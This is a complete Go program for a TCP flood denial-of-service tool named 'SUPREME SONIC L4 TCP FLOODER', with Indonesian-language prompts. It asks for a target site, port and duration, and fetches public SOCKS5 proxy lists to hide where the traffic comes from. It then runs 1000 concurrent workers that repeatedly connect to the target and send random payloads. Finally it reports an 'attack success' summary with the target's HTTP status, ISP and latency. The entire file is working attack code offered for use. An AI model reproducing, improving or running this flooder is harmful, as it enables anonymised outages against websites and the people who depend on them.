package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"
)

const (
	payloadSize = 4096
	workers     = 1000
)

func clear() {
	exec.Command("clear").Run()
}

func logo() {
	fmt.Println(`
███████╗██╗   ██╗██████╗ ███████╗██████╗ ███████╗
██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗██╔════╝
█████╗  ██║   ██║██████╔╝█████╗  ██████╔╝███████╗
██╔══╝  ██║   ██║██╔═══╝ ██╔══╝  ██╔═══╝ ╚════██║
██║     ╚██████╔╝██║     ███████╗██║     ███████║
╚═╝      ╚═════╝ ╚═╝     ╚══════╝╚═╝     ╚══════╝
       SUPREME SONIC L4 TCP FLOODER
`)
}

func GP() []byte {
	b := make([]byte, payloadSize)
	rand.Read(b)
	return b
}

func BL(ip, port, proxyAddr string, stop <-chan struct{}, totalPackets *uint64, duration time.Duration) {
	addr := net.JoinHostPort(ip, port)
	payload := GP()
	startTime := time.Now()

	var dialer proxy.Dialer
	var err error
	if proxyAddr != "" {
		netDialer := &net.Dialer{Timeout: 5 * time.Second}
		dialer, err = proxy.SOCKS5("tcp", proxyAddr, nil, netDialer)
		if err != nil {
			return
		}
	} else {
		dialer = proxy.Direct
	}

	for {
		select {
		case <-stop:
			return
		default:
			if time.Since(startTime) > duration {
				return
			}

			conn, err := dialer.Dial("tcp", addr)
			if err != nil {
				continue
			}

			for i := 0; i < 100; i++ {
				_, err := conn.Write(payload)
				if err != nil {
					break
				}
				atomic.AddUint64(totalPackets, 1)
			}

			conn.Close()
		}
	}
}

func SCode(link string) int {
	if !strings.HasPrefix(link, "http") {
		link = "http://" + link
	}

	client := http.Client{
		Timeout: 3 * time.Second,
	}

	resp, err := client.Get(link)
	if err != nil {
		return 0
	}
	defer resp.Body.Close()
	return resp.StatusCode
}

func InfoIsp(ip string) string {
	resp, err := http.Get("http://ip-api.com/json/" + ip)
	if err != nil {
		return "Tidak diketahui"
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)

	var data map[string]interface{}
	json.Unmarshal(body, &data)

	if isp, ok := data["isp"].(string); ok {
		return isp
	}
	return "-"
}

func PR() []string {
	sources := []string{
		"https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
		"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
		"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
		"https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
	}

	var proxies []string
	for _, url := range sources {
		resp, err := http.Get(url)
		if err != nil {
			continue
		}
		body, _ := ioutil.ReadAll(resp.Body)
		resp.Body.Close()

		lines := strings.Split(string(body), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line != "" && !strings.HasPrefix(line, "#") {
				proxies = append(proxies, line)
			}
		}
	}

	return proxies
}

func AL(ip string) int64 {
	var total int64
	const attempts = 5
	for i := 0; i < attempts; i++ {
		start := time.Now()
		conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, "80"), 2*time.Second)
		if err != nil {
			continue
		}
		conn.Close()
		latency := time.Since(start).Milliseconds()
		total += latency
		time.Sleep(100 * time.Millisecond)
	}
	if total == 0 {
		return -1
	}
	return total / attempts
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	clear()
	logo()

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("+ LINK    : ")
	link, _ := reader.ReadString('\n')
	link = strings.TrimSpace(link)

	fmt.Print("+ PORT    : ")
	port, _ := reader.ReadString('\n')
	port = strings.TrimSpace(port)

	fmt.Print("+ DURASI  : ")
	dur, _ := reader.ReadString('\n')
	dur = strings.TrimSpace(dur)
	sec, _ := strconv.Atoi(dur)

	host := strings.ReplaceAll(link, "https://", "")
	host = strings.ReplaceAll(host, "http://", "")
	host = strings.Split(host, "/")[0]

	ipAddr, err := net.ResolveIPAddr("ip", host)
	if err != nil {
		log.Fatal("CARI SENDIRI IPNYA :", err)
	}

	proxies := PR()
	if len(proxies) == 0 {
		fmt.Println("TIDAK ADA PROXY")
	}

	stop := make(chan struct{})
	var totalPackets uint64

	fmt.Printf("+ PROXY   : %d\n", len(proxies))
	fmt.Printf("\n──────────[ ⚠️ ATTACKING ⚠️ ]──────────\n\n")

	for i := 0; i < workers; i++ {
		var proxyAddr string
		if len(proxies) > 0 {
			proxyAddr = proxies[rand.Intn(len(proxies))]
		}
		go BL(ipAddr.String(), port, proxyAddr, stop, &totalPackets, time.Duration(sec)*time.Second)
	}

	time.Sleep(time.Duration(sec) * time.Second)
	close(stop)

	status := SCode(link)
	isp := InfoIsp(ipAddr.String())
	sinyal := AL(ipAddr.String())

	fmt.Println("╭─────────[ SUKSES ATTACK ]─────────╮")
	fmt.Println("| + TARGET : " + link)
	fmt.Println("| + IP WEB : " + ipAddr.String())
	fmt.Println("| + WAKTU  : " + dur + " detik")
	fmt.Printf("| + STATUS : %d\n", status)
	fmt.Println("| + ISP    : " + isp)
	fmt.Printf("| + PROXY  : %d DI GUNAKAN\n", len(proxies))
	fmt.Printf("| + PAKET  : %d Sending\n", atomic.LoadUint64(&totalPackets))
	if sinyal >= 0 {
		fmt.Printf("| + SIGNAL : %dms\n", sinyal)
	} else {
		fmt.Println("| + SIGNAL : Unknown")
	}
	fmt.Println("╰─────────[ THANKS YA BRO ]─────────╯")
}
